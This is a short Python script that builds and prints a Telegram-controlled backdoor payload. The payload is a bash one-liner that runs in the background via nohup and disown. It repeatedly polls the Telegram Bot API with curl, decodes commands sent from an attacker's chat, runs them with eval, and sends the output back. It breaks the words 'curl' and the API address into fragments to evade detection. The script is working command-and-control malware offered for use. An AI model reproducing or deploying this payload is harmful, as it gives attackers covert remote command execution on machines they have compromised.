import string, random

# cli color codes 
color_white = '\u001b[37m'
color_green = '\u001b[32m'
color_red = '\u001b[31m'
line_override = '\033[F\033[K'

def generate_random_id():
    # Generate three random groups of 6 characters each
    characters = string.digits + string.ascii_letters
    random_id = ''.join(random.choices(characters, k=6))
    return random_id

bot_token = input("\n{}Enter bot token: {}".format(color_green, color_white))
chat_id = input("{}Enter chat ID: {}".format(color_green, color_white))
sleep_interval = input("{}Enter sleep interval (in seconds): {}".format(color_green, color_white))
session_id = generate_random_id()

bt = bot_token.split(":")

payload = payload = '''nohup bash -c 'sl='''+sleep_interval+''';lr="cu";bt="'''+bt[0]+'''";se="essage";sg="/getU";i="/ap";s="s";e="i.teleg";sp="pdates";a="htt";n="rg/bot";ss="/sendM";ee="ram.o";ci="'''+chat_id+'''";ot=0;si="'''+session_id+'''";bk="'''+bt[1]+'''";uc="rl";l="ps:/";hps="chat_id=${ci}&text=$(echo -n "{\\"k\\":\\"${si}\\",\\"c\\":\\"\\",\\"hc\\":\\"1\\"}" | base64)";while true; do r=$("$lr$uc" -"$s" "$a$l$i$e$ee$n$bt:$bk$ss$se?$hps");ps="?offset=${ot}&limit=1&timeout=2";gs=$("$lr$uc" -"$s" "$a$l$i$e$ee$n$bt:$bk$sg$sp$ps");sc=$(echo "$gs" | sed -n "s/.*\\"ok\\":[[:space:]]*\([^,}]*\).*/\\1/p");us=$(echo "$gs" | sed "s/{\\"ok\\":true,\\"result\\":\[//" | sed "s/]}$//");if [ "$sc" = "true" ] && [ -n "$us" ]; then uip="\\"update_id\\":[[:digit:]]+";tp="\\"text\\":\\"[^\\"]+";if [[ $us =~ $uip ]]; then ud="${BASH_REMATCH[0]}";fi;if [[ $us =~ $tp ]]; then tt="${BASH_REMATCH[0]}";fi;ud=$(echo "$ud" | sed "s/\\"update_id\\"://g");tt=$(echo "$tt" | sed "s/\\"text\\":\\"//g");dta=$(echo "$tt" | base64 -d);ttsi=$(echo "$dta" | sed "s/sid=//" | sed "s/,c0mnd=.*//");ttc0=$(echo "$dta" | sed "s/sid=.*,c0mnd=//");if [ -n "$ud" ] && [ -n "$tt" ] && [ $si == $ttsi ]; then ex=$(eval "$ttc0");re=$(echo -e "$ex" | base64);sps="chat_id=${ci}&text=$(echo -n "{\\"k\\":\\"${si}\\",\\"c\\":\\"${ttc0}\\",\\"v\\":\\"${re}\\",\\"hc\\":\\"1\\"}" | base64 -w 0)";z=$("$lr$uc" -"$s" "$a$l$i$e$ee$n$bt:$bk$ss$se?$sps");fi;((ot=ud+1));fi;sleep "$sl";done;' & disown'''

print("\n{}Telegram payload: {}{}\n\n".format(color_green, color_white, payload))